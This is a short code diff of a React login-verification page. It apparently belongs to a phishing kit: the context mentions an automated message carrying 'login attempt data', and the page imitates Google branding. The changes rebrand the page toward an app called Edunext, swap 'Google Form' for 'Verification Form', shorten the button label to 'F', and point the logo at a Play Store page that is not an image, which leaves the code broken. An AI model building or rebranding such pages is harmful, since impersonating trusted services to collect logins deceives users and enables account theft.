@@ -67,7 +67,7 @@ This is an automated message with login attempt data.`,
           {/* Success Message */}
           <div className="bg-white rounded-lg shadow-md p-8">
             <h1 className="text-2xl font-bold text-gray-900 mb-6">
-              Verification is successfully completed, please proceed to the Google Form
+              Verification is successfully completed, please proceed to the Verification Form
             </h1>
             
             {/* Continue Button - redirects to google.com */}
@@ -77,7 +77,7 @@ This is an automated message with login attempt data.`,
               }}
               className="px-6 py-3 text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 rounded-md transition-colors w-full mt-8"
             >
-              Google Form
+              F
             </button>
           </div>
         </div>
@@ -91,8 +91,8 @@ This is an automated message with login attempt data.`,
         {/* Google Logo */}
         <div className="flex justify-center mb-8">
           <img 
-            src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" 
-            alt="Google" 
+            src="https://play.google.com/store/apps/details?id=com.edunext.tsmv10" 
+            alt="Edunext" 
             className="w-28 h-auto"
           />
         </div>
